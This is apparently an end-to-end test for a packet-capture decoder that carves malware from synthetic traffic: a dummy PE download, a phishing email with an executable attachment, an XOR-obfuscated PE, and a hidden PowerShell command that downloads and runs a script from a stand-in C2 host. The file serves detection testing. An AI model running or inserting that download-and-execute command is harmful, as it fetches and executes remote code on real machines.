import base64
import json
import os
import tempfile
import unittest

from pcap_decode.engine import PcapDecoderEngine
from pcap_decode.exporter import Exporter
from pcap_decode.models import ThreatLevel
from tests.pcap_builder import (
    build_ethernet_frame,
    build_ipv4_packet,
    build_tcp_packet,
    build_udp_packet,
    create_pcap_file,
    create_pcapng_file,
    make_dummy_pe,
)


class TestEndToEnd(unittest.TestCase):
    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory()

    def tearDown(self):
        self.temp_dir.cleanup()

    def test_full_pipeline_extraction(self):
        pcap_path = os.path.join(self.temp_dir.name, "multi_malware_traffic.pcap")
        packets = []
        t = 1000.0

        pe_payload = make_dummy_pe(payload_strings=[b"VirtualAlloc", b"WriteProcessMemory", b"http://badc2.org/beacon"])
        http_req = b"GET /dropper.exe HTTP/1.1\r\nHost: evil-update.com\r\n\r\n"
        http_resp = f"HTTP/1.1 200 OK\r\nContent-Type: application/x-dosexec\r\nContent-Length: {len(pe_payload)}\r\n\r\n".encode("latin1") + pe_payload

        p_c_syn = build_ethernet_frame(build_ipv4_packet("192.168.1.10", "203.0.113.5", 6, build_tcp_packet(49152, 80, 100, 0, {"SYN": True}, b"")))
        packets.append((t, p_c_syn))
        t += 0.01

        p_s_synack = build_ethernet_frame(build_ipv4_packet("203.0.113.5", "192.168.1.10", 6, build_tcp_packet(80, 49152, 500, 101, {"SYN": True, "ACK": True}, b"")))
        packets.append((t, p_s_synack))
        t += 0.01

        p_c_req = build_ethernet_frame(build_ipv4_packet("192.168.1.10", "203.0.113.5", 6, build_tcp_packet(49152, 80, 101, 501, {"PSH": True, "ACK": True}, http_req)))
        packets.append((t, p_c_req))
        t += 0.01

        p_s_resp = build_ethernet_frame(build_ipv4_packet("203.0.113.5", "192.168.1.10", 6, build_tcp_packet(80, 49152, 501, 101 + len(http_req), {"PSH": True, "ACK": True}, http_resp)))
        packets.append((t, p_s_resp))
        t += 0.01

        smtp_pe = make_dummy_pe(payload_strings=[b"IsDebuggerPresent", b"CryptEncrypt"])
        b64_smtp_pe = base64.b64encode(smtp_pe).decode("ascii")
        smtp_body = (
            "EHLO pc\r\n"
            "MAIL FROM:<phish@evil.com>\r\n"
            "RCPT TO:<victim@company.com>\r\n"
            "DATA\r\n"
            "From: phish@evil.com\r\n"
            "To: victim@company.com\r\n"
            "Subject: Payment Details\r\n"
            "MIME-Version: 1.0\r\n"
            'Content-Type: multipart/mixed; boundary="BND"\r\n\r\n'
            "--BND\r\n"
            'Content-Disposition: attachment; filename="payment.exe"\r\n'
            "Content-Transfer-Encoding: base64\r\n\r\n"
            f"{b64_smtp_pe}\r\n"
            "--BND--\r\n"
            ".\r\n"
        ).encode("latin1")

        p_smtp = build_ethernet_frame(build_ipv4_packet("192.168.1.20", "198.51.100.25", 6, build_tcp_packet(51234, 25, 200, 300, {"PSH": True, "ACK": True}, smtp_body)))
        packets.append((t, p_smtp))
        t += 0.01

        xor_key = 0x37
        xor_pe = bytes([b ^ xor_key for b in make_dummy_pe()])
        p_xor = build_ethernet_frame(build_ipv4_packet("192.168.1.30", "198.51.100.88", 6, build_tcp_packet(55555, 8888, 10, 20, {"PSH": True, "ACK": True}, xor_pe)))
        packets.append((t, p_xor))
        t += 0.01

        rev_shell_payload = b"powershell.exe -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://c2.bad.com/stage2.ps1')\"\n"
        p_rev = build_ethernet_frame(build_ipv4_packet("192.168.1.40", "198.51.100.99", 6, build_tcp_packet(44444, 4444, 1, 1, {"PSH": True, "ACK": True}, rev_shell_payload)))
        packets.append((t, p_rev))

        create_pcap_file(pcap_path, packets)

        engine = PcapDecoderEngine(carve_raw_streams=True)
        result = engine.decode_file(pcap_path)

        out_dir = os.path.join(self.temp_dir.name, "extracted_output")
        exporter = Exporter(output_dir=out_dir, naming_scheme="detailed")
        export_info = exporter.export(result)

        self.assertEqual(result["packets_count"], 7)
        self.assertGreaterEqual(result["extracted_files_count"], 3)

        files = result["extracted_files"]
        has_http_pe = any("dropper.exe" in f.filename or "evil-update.com" in f.metadata.get("host", "") for f in files)
        self.assertTrue(has_http_pe)

        has_smtp_pe = any("payment.exe" in f.filename for f in files)
        self.assertTrue(has_smtp_pe)

        has_xor_pe = any(f.metadata.get("xor_key") == 0x37 for f in files)
        self.assertTrue(has_xor_pe)

        has_ps_carve = any(f.extension == "ps1" for f in files)
        self.assertTrue(has_ps_carve)

        self.assertTrue(os.path.exists(os.path.join(out_dir, "analysis_report.json")))
        with open(os.path.join(out_dir, "analysis_report.json"), "r") as rf:
            report_json = json.load(rf)
            self.assertEqual(report_json["packets_count"], 7)
            self.assertIn("CRITICAL", report_json["threat_summary"])


if __name__ == "__main__":
    unittest.main()
